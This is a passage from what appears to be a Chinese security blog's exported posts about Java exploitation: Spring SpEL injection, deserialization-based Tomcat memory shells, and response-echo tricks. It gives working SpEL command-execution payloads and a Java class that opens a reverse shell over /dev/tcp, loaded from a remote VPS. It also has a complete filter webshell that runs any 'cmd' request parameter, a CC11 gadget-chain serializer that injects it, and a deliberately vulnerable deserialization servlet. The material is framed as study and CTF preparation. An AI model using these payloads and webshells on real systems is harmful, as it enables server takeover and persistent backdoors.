\"Name: %s%n\" + \"Version: %s%n\" + \"Language name: %s%n\" +\n                   \"Language version: %s%n\" +\n                   \"Extensions: %s%n\" +\n                   \"Mime types: %s%n\" +\n                   \"Names: %s%n\",\n                   factory.getEngineName(),\n                   factory.getEngineVersion(),\n                   factory.getLanguageName(),\n                   factory.getLanguageVersion(),\n                   factory.getExtensions(),\n                   factory.getMimeTypes(),\n                   factory.getNames()\n               );\n       &#125;\n&#125;\n\n\n通过结果中的 Names，我们知道了所有的 js 引擎名称故 getEngineByName 的参数可以填 [nashorn, Nashorn, js, JS, JavaScript, javascript, ECMAScript, ecmascript],举个例子:\nScriptEngineManager sem = new ScriptEngineManager();\nScriptEngine engine = sem.getEngineByName(\"nashorn\");\nSystem.out.println(engine.eval(\"2+1\"));\n\n那么 payload 也就显而易见\n// JavaScript引擎通用PoC\nT(javax.script.ScriptEngineManager).newInstance().getEngineByName(\"nashorn\").eval(\"s=[3];s[0]='cmd';s[1]='/C';s[2]='calc';java.la\"+\"ng.Run\"+\"time.getRu\"+\"ntime().ex\"+\"ec(s);\")\n \nT(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(\"JavaScript\").eval(\"xxx\"),)\n \n// JavaScript引擎+反射调用\nT(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(\"JavaScript\").eval(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"ex\"+\"ec\",T(String[])).invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"getRu\"+\"ntime\").invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\")),new String[]&#123;\"cmd\",\"/C\",\"calc\"&#125;)),)\n \n// JavaScript引擎+URL编码\n// 其中URL编码内容为：\n// 不加最后的getInputStream()也行，因为弹计算器不需要回显\nT(org.springframework.util.StreamUtils).copy(T(javax.script.ScriptEngineManager).newInstance().getEngineByName(\"JavaScript\").eval(T(java.net.URLDecoder).decode(\"%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%61%6c%63%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29\")),)\n\n\n那么payload也就显而易见\nnashorn 作 Engine\nString spel = \"T(javax.script.ScriptEngineManager).newInstance().getEngineByName(\\\"nashorn\\\")\" + \n\".eval(\\\"s=[3];s[0]='cmd';\" +  \n\"s[1]='/C';s[2]='calc';java.la\\\"+\\\"ng.Run\\\"+\\\"time.getRu\\\"+\\\"ntime().ex\\\"+\\\"ec(s);\\\")\";\n\njavascript 作 Engine，这里我复现失败了。\nnew javax.script.ScriptEngineManager().getEngineByName(\"javascript\").eval(\"s=[2];s[0]='open';s[1]='/System/Applications/Calculator.app';java.lang.Runtime.getRuntime().exec(s);\n\n一些尚未复现成功的 PoC// 黑名单过滤\".getClass(\"，可利用数组的方式绕过，还未测试成功\n''['class'].forName('java.lang.Runtime').getDeclaredMethods()[15].invoke(''['class'].forName('java.lang.Runtime').getDeclaredMethods()[7].invoke(null),'calc')\n \n// JDK9新增的shell，还未测试\nT(SomeWhitelistedClassNotPartOfJDK).ClassLoader.loadClass(\"jdk.jshell.JShell\",true).Methods[6].invoke(null,&#123;&#125;).eval('whatever java code in one statement').toString()\n\n通过 ClassLoader 类加载器构造 PoC&amp;Bypass\n关于 ClassLoader Java反序列化基础篇-05-类的动态加载\n\nURLClassLoader 结合 SpEL 表达式注入先构造一份 Exp.jar , 放到远程 vps 即可，.class 也行\n一份通过构造方法反弹 shell 的 Exp.java 实例\npublic class Exp&#123;\n    public Exp(String address)&#123;\n        address = address.replace(\":\",\"/\");\n        ProcessBuilder p = new ProcessBuilder(\"/bin/bash\",\"-c\",\"exec 5&lt;>/dev/tcp/\"+address+\";cat &lt;&amp;5 | while read line; do $line 2>&amp;5 >&amp;5; done\");\n        try &#123;\n            p.start();\n        &#125; catch (IOException e) &#123;\n            e.printStackTrace();\n        &#125;\n    &#125;\n&#125;\n\n起一个 http 服务示例\npython -m SimpleHTTPServer 8990\n\n\nPayload\n注意必须使用全限定类名 , 或许这个可以过一些bypass\nnew java.net.URLClassLoader(new java.net.URL[]&#123;new java.net.URL(\"http://127.0.0.1:8999/Exp.jar\")&#125;).loadClass(\"Exp\").getConstructors()[0].newInstance(\"127.0.0.1:2333\")\n\n在 vps 上开启监听 2333 端口即可。\nAppClassLoader\n加载 Runtime 执行\n\n由于需要调用到静态方法所以还是要用到 T() 操作\nT(ClassLoader).getSystemClassLoader().loadClass(\"java.lang.Runtime\").getRuntime().exec(\"open /System/Applications/Calculator.app\")\n\n\n加载 ProcessBuilder 执行\n\nT(ClassLoader).getSystemClassLoader().loadClass(\"java.lang.ProcessBuilder\").getConstructors()[1].newInstance(new String[]&#123;\"open\",\"/System/Applications/Calculator.app\"&#125;).start()\n\n\n\n通过其他类获取 AppClassLoader实例1:\n使用 SpEL 的话一定存在名为 org.springframework 的包，这个包下有许许多多的类，而这些类的 classloader 就是 AppClassLoader\n\n\n\n比如: org.springframework.expression.Expression 类\nSystem.out.println( org.springframework.expression.Expression.class.getClassLoader() );\n\n那么很容易就可以得到一个获取 AppClassLoader 的方法 ,\nT(org.springframework.expression.Expression).getClass().getClassLoader()\n\n假设使用 thyemleaf 的话会有org.thymeleaf.context.AbstractEngineContext\nT(org.thymeleaf.context.AbstractEngineContext).getClass().getClassLoader()\n\n假设有一个自定义的类那么可以:\nT(com.ctf.controller.Demo).getClass().getClassLoader()\n\n类比较多，不过多叙述，感觉 CTF 里面可能会出这种\n通过内置对象加载 URLClassLoader这里在 0c0c0f18 年的一个文章学到了两个 poc，部分截图如下\n\n\n&#123;request.getClass().getClassLoader().loadClass(\\\"java.lang.Runtime\\\").getMethod(\\\"getRuntime\\\").invoke(null).exec(\\\"touch/tmp/foobar\\\")&#125;\n\nusername[#this.getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"js\").eval(\"java.lang.Runtime.getRuntime().exec('xterm')\")]=asdf\n\nrequest、response 对象是 Web 项目的常客,通过第一个 poc 测试发现在 Web 项目如果引入了 SpEL 的依赖，那么这两个对象会自动被注册进去。\n像这样，会发现它调用的是 URLClassLoader\n\n\n字符串 bypass以下内容参考：SpEL注入RCE分析与绕过 - 先知社区 (aliyun.com)\n\n我个人的感觉是实现起来有点…………嗯……不太靠谱，这里本地复现也失败了，有兴趣的师傅们可以看一下。\n\n0x05 关于 SpEL 表达式的实战参考项目，首先是输入点必须可控，后续会复现几个漏洞看看。\nDrun1baby&#x2F;JavaSecurityLearning\n0x06 参考资料https://xz.aliyun.com/t/9245SpEL表达式注入漏洞总结\n","categories":["Java"],"tags":["Java"]},{"title":"Java 反序列化打内存马","url":"/2022/11/29/Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%89%93%E5%86%85%E5%AD%98%E9%A9%AC/","content":"Java 反序列化打内存马\n\nJava 反序列化打内存马0x01 前言其实这篇文章早就该写了，只是因为自己一些个人原因和犯懒癌一直搁置，最近要开始了。\n\n当然看这道题目的最主要原因是因为内存马的应用面太广了，很多不出网的场景、以及攻防的场景都可以用到。\n\n像之前的文章，Tomcat 的三种内存马，实际上都只是一种简单的实验，而非完全能够应用，就算应用起来也是有文件落地现象的，这并非是真正的内存马。\n而且在之前 2022 祥云杯上，也出了一道 Java CC4 链的不出网写内存马的题目，处于相当好奇的原因，写下了这篇文章。\n所以在这篇文章中，我们来学习利用反序列化来实现真正意义上的内存马的注入，本文中会结合 cc11 来进行内存马注入，这样可以实现真正的文件不落地，在上文利用 jsp 注入的时候由于 request 和 response 是 jsp 的内置对象，所以在回显问题上不用考虑，但是当我们结合反序列化进行注入的时候这些都成了需要考量的地方，这也是本文学习的一个点\n0x02 回显问题已总结在本文中，不再赘述\nhttps://drun1baby.github.io/2022/11/30/Java-%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF/\n0x03 反序列化打内存马半通用回显 Tomcat 打内存马这里要用 web-app 的项目，并且用低版本的 Tomcat\n先写一个 servlet\nimport javax.servlet.annotation.WebServlet;  \nimport javax.servlet.http.HttpServlet;  \nimport javax.servlet.http.HttpServletRequest;  \nimport javax.servlet.http.HttpServletResponse;  \nimport java.io.IOException;  \nimport java.io.InputStream;  \nimport java.io.ObjectInputStream;  \n  \n@WebServlet(\"/cc\")  \npublic class CCServlet extends HttpServlet &#123;  \n    @Override  \n    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException &#123;  \n        InputStream inputStream = (InputStream) req;  \n        ObjectInputStream objectInputStream = new ObjectInputStream(inputStream);  \n        try &#123;  \n            objectInputStream.readObject();  \n        &#125; catch (ClassNotFoundException e) &#123;  \n            e.printStackTrace();  \n        &#125;  \n        resp.getWriter().write(\"Success\");  \n    &#125;  \n  \n    @Override  \n    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws IOException &#123;  \n        InputStream inputStream = req.getInputStream();  \n        ObjectInputStream objectInputStream = new ObjectInputStream(inputStream);  \n        try &#123;  \n            objectInputStream.readObject();  \n        &#125; catch (ClassNotFoundException e) &#123;  \n            e.printStackTrace();  \n        &#125;  \n        resp.getWriter().write(\"Success\");  \n    &#125;  \n&#125;\n\n接着，实现 Kingkk 师傅提出来的 Tomcat 半通用回显。这一步在 Java 回显技术的文章里面已经讲的比较清楚了。\npackage EXP;  \n  \nimport com.sun.org.apache.xalan.internal.xsltc.DOM;  \nimport com.sun.org.apache.xalan.internal.xsltc.TransletException;  \nimport com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;  \nimport com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;  \nimport com.sun.org.apache.xml.internal.serializer.SerializationHandler;  \n  \nimport java.lang.reflect.Modifier;  \n  \npublic class TomcatEcho extends AbstractTranslet &#123;  \n  \n    static &#123;  \n        try &#123;  \n            // 修改 WRAP_SAME_OBJECT 值为 true            Class c = Class.forName(\"org.apache.catalina.core.ApplicationDispatcher\");  \n            java.lang.reflect.Field f = c.getDeclaredField(\"WRAP_SAME_OBJECT\");  \n            java.lang.reflect.Field modifiersField = f.getClass().getDeclaredField(\"modifiers\");    //获取modifiers字段  \n            modifiersField.setAccessible(true);   //将变量设置为可访问  \n            modifiersField.setInt(f, f.getModifiers() &amp; ~Modifier.FINAL); //取消FINAL属性  \n            f.setAccessible(true);    //将变量设置为可访问  \n            if (!f.getBoolean(null)) &#123;  \n                f.setBoolean(null, true); //将变量设置为true  \n            &#125;  \n  \n            // 初始化 lastServicedRequest &amp; lastServicedResponse            c = Class.forName(\"org.apache.catalina.core.ApplicationFilterChain\");  \n            f = c.getDeclaredField(\"lastServicedRequest\");  \n            modifiersField = f.getClass().getDeclaredField(\"modifiers\");  \n            modifiersField.setAccessible(true);  \n            modifiersField.setInt(f, f.getModifiers() &amp; ~java.lang.reflect.Modifier.FINAL);  \n            f.setAccessible(true);  \n            if (f.get(null) == null) &#123;  \n                f.set(null, new ThreadLocal());   //设置ThreadLocal对象  \n            &#125;  \n  \n            f = c.getDeclaredField(\"lastServicedResponse\");  \n            modifiersField = f.getClass().getDeclaredField(\"modifiers\");  \n            modifiersField.setAccessible(true);  \n            modifiersField.setInt(f, f.getModifiers() &amp; ~java.lang.reflect.Modifier.FINAL);  \n            f.setAccessible(true);  \n            if (f.get(null) == null) &#123;  \n                f.set(null, new ThreadLocal());   //设置ThreadLocal对象  \n            &#125;  \n  \n        &#125; catch (Exception e) &#123;  \n            e.printStackTrace();  \n        &#125;  \n    &#125;  \n    @Override  \n    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;  \n  \n    &#125;  \n  \n    @Override  \n    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler)  \n            throws TransletException &#123;  \n  \n    &#125;  \n&#125;\n\n然后是取出 request 和 response 并注入 filter，和之前 filter 内存马的写法有很多相似之处。\npackage EXP;  \n  \nimport com.sun.org.apache.xalan.internal.xsltc.DOM;  \nimport com.sun.org.apache.xalan.internal.xsltc.TransletException;  \nimport com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;  \nimport com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;  \nimport com.sun.org.apache.xml.internal.serializer.SerializationHandler;  \nimport org.apache.catalina.LifecycleState;  \nimport org.apache.catalina.core.ApplicationContext;  \nimport org.apache.catalina.core.StandardContext;  \n  \nimport java.io.IOException;  \nimport java.lang.reflect.Field;  \nimport java.lang.reflect.Method;  \nimport javax.servlet.Filter;  \nimport javax.servlet.FilterChain;  \nimport javax.servlet.FilterConfig;  \nimport javax.servlet.ServletContext;  \nimport javax.servlet.ServletException;  \nimport javax.servlet.ServletRequest;  \nimport javax.servlet.ServletResponse;  \n  \n/**  \n * @author threedr3am  \n */public class TomcatInject extends AbstractTranslet implements Filter &#123;  \n  \n    /**  \n     * webshell命令参数名  \n     */  \n    private final String cmdParamName = \"cmd\";  \n    private final static String filterUrlPattern = \"/*\";  \n    private final static String filterName = \"Drunkbaby\";  \n  \n    static &#123;  \n        try &#123;  \n            ServletContext servletContext = getServletContext();  \n            if (servletContext != null)&#123;  \n                Field ctx = servletContext.getClass().getDeclaredField(\"context\");  \n                ctx.setAccessible(true);  \n                ApplicationContext appctx = (ApplicationContext) ctx.get(servletContext);  \n  \n                Field stdctx = appctx.getClass().getDeclaredField(\"context\");  \n                stdctx.setAccessible(true);  \n                StandardContext standardContext = (StandardContext) stdctx.get(appctx);  \n  \n                if (standardContext != null)&#123;  \n                    // 这样设置不会抛出报错  \n                    Field stateField = org.apache.catalina.util.LifecycleBase.class  \n                            .getDeclaredField(\"state\");  \n                    stateField.setAccessible(true);  \n                    stateField.set(standardContext, LifecycleState.STARTING_PREP);  \n  \n                    Filter myFilter =new TomcatInject();  \n                    // 调用 doFilter 来动态添加我们的 Filter                    // 这里也可以利用反射来添加我们的 Filter                    javax.servlet.FilterRegistration.Dynamic filterRegistration =  \n                            servletContext.addFilter(filterName,myFilter);  \n  \n                    // 进行一些简单的设置  \n                    filterRegistration.setInitParameter(\"encoding\", \"utf-8\");  \n                    filterRegistration.setAsyncSupported(false);  \n                    // 设置基本的 url pattern                    filterRegistration  \n                            .addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), false,  \n                                    new String[]&#123;\"/*\"&#125;);  \n  \n                    // 将服务重新修改回来，不然的话服务会无法正常进行  \n                    if (stateField != null)&#123;  \n                        stateField.set(standardContext,org.apache.catalina.LifecycleState.STARTED);  \n                    &#125;  \n  \n                    // 在设置之后我们需要 调用 filterstart                    if (standardContext != null)&#123;  \n                        // 设置filter之后调用 filterstart 来启动我们的 filter                        Method filterStartMethod = StandardContext.class.getDeclaredMethod(\"filterStart\");  \n                        filterStartMethod.setAccessible(true);  \n                        filterStartMethod.invoke(standardContext,null);  \n  \n                        /**  \n                         * 将我们的 filtermap 插入到最前面  \n                         */  \n  \n                        Class ccc = null;  \n                        try &#123;  \n                            ccc = Class.forName(\"org.apache.tomcat.util.descriptor.web.FilterMap\");  \n                        &#125; catch (Throwable t)&#123;&#125;  \n                        if (ccc == null) &#123;  \n                            try &#123;  \n                                ccc = Class.forName(\"org.apache.catalina.deploy.FilterMap\");  \n                            &#125; catch (Throwable t)&#123;&#125;  \n                        &#125;  \n                        //把filter插到第一位  \n                        Method m = Class.forName(\"org.apache.catalina.core.StandardContext\")  \n                                .getDeclaredMethod(\"findFilterMaps\");  \n                        Object[] filterMaps = (Object[]) m.invoke(standardContext);  \n                        Object[] tmpFilterMaps = new Object[filterMaps.length];  \n                        int index = 1;  \n                        for (int i = 0; i &lt; filterMaps.length; i++) &#123;  \n                            Object o = filterMaps[i];  \n                            m = ccc.getMethod(\"getFilterName\");  \n                            String name = (String) m.invoke(o);  \n                            if (name.equalsIgnoreCase(filterName)) &#123;  \n                                tmpFilterMaps[0] = o;  \n                            &#125; else &#123;  \n                                tmpFilterMaps[index++] = filterMaps[i];  \n                            &#125;  \n                        &#125;  \n                        for (int i = 0; i &lt; filterMaps.length; i++) &#123;  \n                            filterMaps[i] = tmpFilterMaps[i];  \n                        &#125;  \n                    &#125;  \n                &#125;  \n  \n            &#125;  \n  \n        &#125; catch (Exception e) &#123;  \n            e.printStackTrace();  \n        &#125;  \n    &#125;  \n  \n    private static ServletContext getServletContext()  \n            throws NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;  \n        ServletRequest servletRequest = null;  \n        /*shell注入，前提需要能拿到request、response等*/  \n        Class c = Class.forName(\"org.apache.catalina.core.ApplicationFilterChain\");  \n        java.lang.reflect.Field f = c.getDeclaredField(\"lastServicedRequest\");  \n        f.setAccessible(true);  \n        ThreadLocal threadLocal = (ThreadLocal) f.get(null);  \n        //不为空则意味着第一次反序列化的准备工作已成功  \n        if (threadLocal != null &amp;&amp; threadLocal.get() != null) &#123;  \n            servletRequest = (ServletRequest) threadLocal.get();  \n        &#125;  \n        //如果不能去到request，则换一种方式尝试获取  \n  \n        //spring获取法1  \n        if (servletRequest == null) &#123;  \n            try &#123;  \n                c = Class.forName(\"org.springframework.web.context.request.RequestContextHolder\");  \n                Method m = c.getMethod(\"getRequestAttributes\");  \n                Object o = m.invoke(null);  \n                c = Class.forName(\"org.springframework.web.context.request.ServletRequestAttributes\");  \n                m = c.getMethod(\"getRequest\");  \n                servletRequest = (ServletRequest) m.invoke(o);  \n            &#125; catch (Throwable t) &#123;&#125;  \n        &#125;  \n        if (servletRequest != null)  \n            return servletRequest.getServletContext();  \n  \n        //spring获取法2  \n        try &#123;  \n            c = Class.forName(\"org.springframework.web.context.ContextLoader\");  \n            Method m = c.getMethod(\"getCurrentWebApplicationContext\");  \n            Object o = m.invoke(null);  \n            c = Class.forName(\"org.springframework.web.context.WebApplicationContext\");  \n            m = c.getMethod(\"getServletContext\");  \n            ServletContext servletContext = (ServletContext) m.invoke(o);  \n            return servletContext;  \n        &#125; catch (Throwable t) &#123;&#125;  \n        return null;  \n    &#125;  \n  \n    @Override  \n    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;  \n  \n    &#125;  \n  \n    @Override  \n    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler)  \n            throws TransletException &#123;  \n  \n    &#125;  \n  \n    @Override  \n    public void init(FilterConfig filterConfig) throws ServletException &#123;  \n  \n    &#125;  \n  \n    @Override  \n    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse,  \n                         FilterChain filterChain) throws IOException, ServletException &#123;  \n        System.out.println(  \n                \"TomcatShellInject doFilter.....................................................................\");  \n        String cmd;  \n        if ((cmd = servletRequest.getParameter(cmdParamName)) != null) &#123;  \n            Process process = Runtime.getRuntime().exec(cmd);  \n            java.io.BufferedReader bufferedReader = new java.io.BufferedReader(  \n                    new java.io.InputStreamReader(process.getInputStream()));  \n            StringBuilder stringBuilder = new StringBuilder();  \n            String line;  \n            while ((line = bufferedReader.readLine()) != null) &#123;  \n                stringBuilder.append(line + '\\n');  \n            &#125;  \n            servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());  \n            servletResponse.getOutputStream().flush();  \n            servletResponse.getOutputStream().close();  \n            return;  \n        &#125;  \n        filterChain.doFilter(servletRequest, servletResponse);  \n    &#125;  \n  \n    @Override  \n    public void destroy() &#123;  \n  \n    &#125;  \n&#125;\n\n如此一来，我们接下来只需要注入即可，这点在 《Java 回显技术》一文当中我也有提到过，必须是要通过动态加载字节码的形式，才可以打，所以这里我们用魔改的 CC11 链子\npackage EXP;  \n  \nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  \nimport org.apache.commons.collections.functors.InvokerTransformer;  \nimport org.apache.commons.collections.keyvalue.TiedMapEntry;  \nimport org.apache.commons.collections.map.LazyMap;  \n  \nimport java.io.*;  \nimport java.lang.reflect.Field;  \nimport java.util.HashMap;  \nimport java.util.HashSet;  \n  \n@SuppressWarnings(\"all\")  \npublic class CC11Template &#123;  \n  \n    public static void main(String[] args) throws Exception &#123;  \n        byte[] bytes = getBytes();  \n        byte[][] targetByteCodes = new byte[][]&#123;bytes&#125;;  \n        TemplatesImpl templates = TemplatesImpl.class.newInstance();  \n  \n        Field f0 = templates.getClass().getDeclaredField(\"_bytecodes\");  \n        f0.setAccessible(true);  \n        f0.set(templates,targetByteCodes);  \n  \n        f0 = templates.getClass().getDeclaredField(\"_name\");  \n        f0.setAccessible(true);  \n        f0.set(templates,\"name\");  \n  \n        f0 = templates.getClass().getDeclaredField(\"_class\");  \n        f0.setAccessible(true);  \n        f0.set(templates,null);  \n  \n        // 利用反射调用 templates 中的 newTransformer 方法  \n        InvokerTransformer transformer = new InvokerTransformer(\"asdfasdfasdf\", new Class[0], new Object[0]);  \n        HashMap innermap = new HashMap();  \n        LazyMap map = (LazyMap)LazyMap.decorate(innermap,transformer);  \n        TiedMapEntry tiedmap = new TiedMapEntry(map,templates);  \n        HashSet hashset = new HashSet(1);  \n        hashset.add(\"foo\");  \n        // 我们要设置 HashSet 的 map 为我们的 HashMap        Field f = null;  \n        try &#123;  \n            f = HashSet.class.getDeclaredField(\"map\");  \n        &#125; catch (NoSuchFieldException e) &#123;  \n            f = HashSet.class.getDeclaredField(\"backingMap\");  \n        &#125;  \n        f.setAccessible(true);  \n        HashMap hashset_map = (HashMap) f.get(hashset);  \n  \n        Field f2 = null;  \n        try &#123;  \n            f2 = HashMap.class.getDeclaredField(\"table\");  \n        &#125; catch (NoSuchFieldException e) &#123;  \n            f2 = HashMap.class.getDeclaredField(\"elementData\");  \n        &#125;  \n  \n        f2.setAccessible(true);  \n        Object[] array = (Object[])f2.get(hashset_map);  \n  \n        Object node = array[0];  \n        if(node == null)&#123;  \n            node = array[1];  \n        &#125;  \n        Field keyField = null;  \n        try&#123;  \n            keyField = node.getClass().getDeclaredField(\"key\");  \n        &#125;catch(Exception e)&#123;  \n            keyField = Class.forName(\"java.util.MapEntry\").getDeclaredField(\"key\");  \n        &#125;  \n        keyField.setAccessible(true);  \n        keyField.set(node,tiedmap);  \n  \n        // 在 invoke 之后，  \n        Field f3 = transformer.getClass().getDeclaredField(\"iMethodName\");  \n        f3.setAccessible(true);  \n        f3.set(transformer,\"newTransformer\");  \n  \n        try&#123;  \n            //ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\"./cc11Step1.ser\"));  \n            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\"./cc11Step2.ser\"));  \n            outputStream.writeObject(hashset);  \n            outputStream.close();  \n  \n        &#125;catch(Exception e)&#123;  \n            e.printStackTrace();  \n        &#125;  \n    &#125;  \n  \n    public static byte[] getBytes() throws IOException &#123;  \n        //    第一次  \n        //        InputStream inputStream = new FileInputStream(new File(\"E://TomcatEcho.class\"));  \n        //  第二次  \n        InputStream inputStream = new FileInputStream(new File(\"E://TomcatInject.class\"));  \n  \n        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();  \n        int n = 0;  \n        while ((n=inputStream.read())!=-1)&#123;  \n            byteArrayOutputStream.write(n);  \n        &#125;  \n        byte[] bytes = byteArrayOutputStream.toByteArray();  \n        return bytes;  \n    &#125;  \n&#125;\n\n接连注入即可，这里因为代码我们可以直接注入 .ser 序列化的文件，如果是要输入 string，简单把 .ser 文件 base64 一下即可。\n\n\n\n\n\n\n\n这一种反序列化打内存马的方式缺陷也很明显，就是像 shiro 这些自带 Filter 的无法打通，所以如果是 shiro550 打内存马，需要用 《Java 回显技术》的第三种方法，获取全局 response，并且根据 Tomcat 版本打。\n\n内存马打 shiro550\n通过全局存储 Response 回显来打\n\n这里直接借用了木爷的工具 https://github.com/KpLi0rn/ShiroVulnEnv\n\n\n0x04 改写 ysoserial 增加内存马等功能后续会再专门写一篇关于改写 yso 的文章，再说吧（咕咕咕\n","categories":["Java"],"tags":["Java"]},{"title":"Java 回显技术","url":"/2022/11/30/Java-%E5%9B%9E%E6%98%BE%E6%8A%80%E6%9C%AF/","content":"Java 回显技术\n\nJava 回显技术学习博客崩了，导致之前写的这篇文章也无了。。。人麻了\n0x01 前言因为最近正在学习 Java 内存马相对应的一些知识，写这篇文章是为了让自己更好的学习 Java 内存马的一些回显技术\n0x02 通过文件描述符回显是对 /proc/self/fd/i 的攻击拓展，真玄学啊，这也能打……\n分析在 Linux 环境下，可以通过文件描述符  /proc/self/fd/i 获取到网络连接，在 Java 中我们可以直接通过文件描述符获取到一个 Stream 对象，对当前网络连接进行读写操作，可以釜底抽薪在根源上解决回显问题。简单来讲就是利用 Linux 文件描述符实现漏洞回显。\n从理论上讲如果获取到了当前请求对应进程的文件描述符，如果输出描述符中写入内容，那么就会在回显中显示，从原理上是可行的，但在这个过程中主要有一个问题需要解决：如何获得本次请求的文件描述符\n解决这个问题就要思考在一次连接请求过程中有什么特殊的东西可通过代码识别出来，从而筛选出对应的请求信息。那么这个特殊的标识应该就是，客户端的访问ip地址了。\n在 /proc/net/tcp6 文件中存储了大量的连接请求\n\n\n其中 local_address 是服务端的地址和连接端口，remote_address 是远程机器的地址和端口（客户端也在此记录），因此我们可以通过 remote_address 字段筛选出需要的 inode 号。这里的 inode 号会在 /proc/xx/fd/ 中的 socket 一一对应\n去到 proc/&#123;进程号&#125;/fd 文件夹下，执行 ll 命令\n\n\n有了这个对应关系，我们就可以在 &#x2F;proc&#x2F;xx&#x2F;fd&#x2F; 目录中筛选出对应inode号的socket，从而获取了文件描述符。整体思路如下\n\n通过 client ip 在 /proc/net/tcp6 文件中筛选出对应的 inode 号（也有可能是 /proc/net/tcp 文件）\n通过 inode 号在 /proc/self/fd/ 中筛选出fd号\n创建 FileDescriptor 对象\n执行命令并向 FileDescriptor 对象输出命令执行结果\n\n0x03 Kingkk 师傅提出的 “Tomcat中一种半通用回显方法”在 Java 代码执行的时候如果能获取到 response 对象，则可以直接向 response 对象中写入命令执行的结果实现回显。因此这里的目的就是寻找一个能够利用的 response 对象，思路如下：\n\n通过翻阅函数调用栈寻找存储 response 的类\n最好是个静态变量，这样不需要获取对应的实例，毕竟获取对象还是挺麻烦的\n使用 ThreadLocal 保存的变量，在获取的时候更加方便，不会有什么错误\n修复原有输出，通过分析源码找到问题所在\n\n分析寻找并获取response首先是确定当前我们取到的一个 response 对象是 tomcat 的 response，我们顺着堆栈一直往回找。\n\n\n找到HTTP请求的入口那里发现request和response几乎就是一路传递的，并且在内存中都是同一个变量（变量toString最后的数字就是当前变量的部分哈希）\n\n\n这样，就没有问题，只要我们能获取到这些堆栈中，任何一个类的response实例即可。\n按照上述的思路找到了保存在ApplicationFilterChain对象中的静态且是ThreadLocal保存的的Response类型属性lastServicedResponse\n\n\n但是这里的静态代码块在初始化的时候已经把lastServicedResponse的值设置为null，然后后面在internalDoFilter方法里面还有一个将当前的resquest和response对象赋值给lastServicedRequest和lastServicedResponse对象的操作，但是还是需要ApplicationDispatcher.WRAP_SAME_OBJECT 的值为true。\n\n\n因此这里有需要进行两个操作：\n\n反射修改ApplicationDispatcher.WRAP_SAME_OBJECT的值为ture，让代码逻辑走到if条件里面\n初始化lastServicedRequest和lastServicedResponse两个变量为ThreadLocal类型（静态代码在初始化时默认为null）\n\ngetWriter重复使用报错在使用response的getWriter函数时，usingWriter 变量就会被设置为true。如果在一次请求中usingWriter变为了true那么在这次请求之后的结果输出时就会报错\n\n\n报错内容如下，getWriter已经被调用过一次\njava.lang.IllegalStateException: getWriter() has already been called for this response\n\n这时候有两种解决办法：\n\n在调用完一次getWriter反射修改usingWriter的值为false\n使用getOutputStream代替\n\n小结总体原理为：通过反射修改控制变量，来改变Tomcat处理请求时的流程，使得Tomcat处理请求时便将request, response对象存入ThreadLocal中，最后在反序列化的时候便可以利用ThreadLocal来取出response。\n具体实施步骤为：\n\n使用反射把ApplicationDispathcer.WRAP_SAME_OBJECT变量修改为true\n使用反射初始化ApplicationDispathcer中的lastServicedResponse变量为ThreadLocal\n使用反射从lastServicedResponse变量中获取tomcat response变量\n使用反射将usingWriter属性修改为false修复输出报错\n\n实现\nApplicationDispathcer.WRAP_SAME_OBJECT变量修改为true\n\n通过上面的需求，编写对应的代码进行实现，需要提前说明的是WRAP_SAME_OBJECT、lastServicedRequest、lastServicedResponse为static final变量，而且后两者为私有变量，因此需要modifiersField的处理将final属性取消掉。\nField WRAP_SAME_OBJECT_FIELD = Class.forName(\"org.apache.catalina.core.ApplicationDispatcher\").getDeclaredField(\"WRAP_SAME_OBJECT\");//获取WRAP_SAME_OBJECT字段\nField modifiersField = Field.class.getDeclaredField(\"modifiers\");//获取modifiers字段\nmodifiersField.setAccessible(true);//将变量设置为可访问\nmodifiersField.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() &amp; ~Modifier.FINAL);//取消FINAL属性\nWRAP_SAME_OBJECT_FIELD.setAccessible(true); //将变量设置为可访问\nWRAP_SAME_OBJECT_FIELD.setBoolean(null, true); //将变量设置为true\n\n\n初始化ApplicationDispathcer中的lastServicedResponse变量为ThreadLocal\n\n这里需要把lastServicedResponse和lastServiceRequest都进行设置，因为如果这两个其中之一的变量为初始化就会在set的地方报错。\n这里仅仅实现了如何初始化lastServicedRequest和lastServicedResponse这两个变量为ThreadLocal。在实际实现过程中需要添加判断，如果lastServicedRequest存储的值不是null那么就不要进行初始化操作。\n\n从lastServicedResponse变量中获取tomcat response变量\n\n从上面代码中的lastServicedResponseField直接获取lastServicedResponse变量，因为这时的lastServicedResponse变量为ThreadLocal变量，可以直接通过get方法获取其中存储的变量。\nThreadLocal&lt;ServletResponse> lastServicedResponse = (ThreadLocal&lt;ServletResponse>) 